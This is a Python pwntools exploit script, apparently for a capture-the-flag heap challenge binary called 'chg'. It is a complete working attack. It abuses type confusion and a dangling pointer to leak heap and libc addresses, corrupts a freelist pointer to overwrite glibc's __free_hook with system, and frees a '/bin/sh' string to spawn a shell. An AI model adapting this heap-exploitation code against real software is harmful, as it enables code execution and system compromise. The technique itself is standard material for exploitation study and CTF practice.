from pwn import *

TYPE_LONG   = 1
TYPE_DOUBLE = 2
TYPE_STRING = 3

CMD_ADD     = b"1"
CMD_GET     = b"2"
CMD_EDIT    = b"3"
CMD_DEL     = b"4"

CURRENT_IDX     = 0
ARCH            = platform.machine()
if ARCH == "x86_64":
    MAIN_ARENA_OFF  = 0x1ebbe0
    LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
elif ARCH == "aarch64":
    MAIN_ARENA_OFF  = 0x16dac0
    LIBC_PATH = "/lib/aarch64-linux-gnu/libc.so.6"
else:
    raise Exception("Platform not supported")

def add(s, typ, data):
    global CURRENT_IDX

    CURRENT_IDX += 1
    s.sendlineafter(b"> ", CMD_ADD)
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.sendafter(b"Data: ", data + b"\n")
    return CURRENT_IDX - 1

def get(s, idx, typ):
    s.sendlineafter(b"> ", CMD_GET)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.recvuntil(b"Data: ")
    return s.recvline()[:-1]

def edit(s, idx, typ, data):
    s.sendlineafter(b"> ", CMD_EDIT)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.sendafter(": ", bytes(str(data), "utf-8") + b"\n")

def delete(s, idx):
    global CURRENT_IDX

    CURRENT_IDX -= 1
    s.sendlineafter(b"> ", CMD_DEL)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    return

def create_dangling_ptr_in_fpool(p):
    add(p, TYPE_STRING, b"R"*0x60)
    list_data_ptr = int(get(p, 0, TYPE_LONG))
    delete(p, 0)

    for i in range(8):
        add(p, TYPE_LONG, bytes(str(0), "utf-8"))
    for i in range(8):
        delete(p, 0)

    return list_data_ptr

def leak_ptrs(p):
    add(p, TYPE_STRING, b"A"*0x10)
    for i in range(9):
        add(p, TYPE_STRING, b"C"*0x7f)
    for i in range(8):
        delete(p, 0)

    # leak heap (type confusion)
    heap_addr = int(get(p, 0, TYPE_LONG))

    print("[*] edit list[1] to point to list[0], which has main_arena symbol in its content")
    edit(p, 1, TYPE_LONG, heap_addr)

    print("[*] delete list[0], move list[1] one position backward")
    delete(p, 0)

    print("[*] read the dangling pointer in list[0] with TYPE_STRING, leak libc")

    main_arena = u64(get(p, 0, TYPE_STRING).ljust(8, b"\x00"))
    return (heap_addr, main_arena)

def exploit(p):
    libc = ELF(LIBC_PATH)
    elf = ELF("./distfiles/chg")

    # start by leaking heap && libc addresses
    list_data_ptr = create_dangling_ptr_in_fpool(p)
    print("[*] good, now fpool[0] points to list. list_data_ptr == 0x%x" % list_data_ptr)

    heap_addr, main_arena = leak_ptrs(p)
    print("[*] heap_addr @ 0x%x" % heap_addr)
    print("[*] main_arena @ 0x%x" % main_arena)

    libc_base = main_arena - MAIN_ARENA_OFF
    free_hook = libc_base + libc.symbols["__free_hook"]
    system_addr = libc_base + libc.symbols["system"]
    print("[*] resolved addresses:")
    print("\tlibc @ 0x%x" % libc_base)
    print("\t__free_hook @ 0x%x" % free_hook)
    print("\tsystem @ 0x%x" % system_addr)

    # start corruption phase!
    strings_idx = []
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))
    delete(p, strings_idx[:-1])

    print("[*] trigger a free of the list pointer, and call edit to corrupt FD and gain arbitrary write")
    edit(p, 1, TYPE_LONG, list_data_ptr)
    delete(p, 1)
    
    # This is a bit unfortunate -- read_long reads 14 chars, while __free_hook and system's decimal representation is 15
    # Also, the challenge calls atol and not strtol; so we can't just send hex with "0x"-prefix
    print("[*] corrupt list_data_ptr->FD, make it point to __free_hook")
    edit(p, 0, TYPE_LONG, free_hook-0x58)
    edit(p, 1, TYPE_LONG, 0)
   
    # Because our arbitrary write is by controlling malloc's return value, and
    # our controlled VA is in the freelist of larger chunks, we need to actually
    # allocate a long string. So pad with random data (just not NULL bytes), and
    # add the address of system at the end
    for i in range(2):
        fake = b"A"*0x58
        #fake += p64(system_addr)
        fake += p64(system_addr)
        add(p, TYPE_STRING, fake)

    print("[*] __free_hook('/bin/sh/')")
    bin_sh_idx = add(p, TYPE_STRING, b"/bin/sh")
    delete(p, bin_sh_idx)

if __name__ == "__main__":
    p = process("./distfiles/chg", env={"LD_LIBRARY_PATH": "./distfiles"})
    input("attach")
    exploit(p)
    print("[*] exploit done, system('/bin/sh') achieved, call interactive()")
    p.interactive()
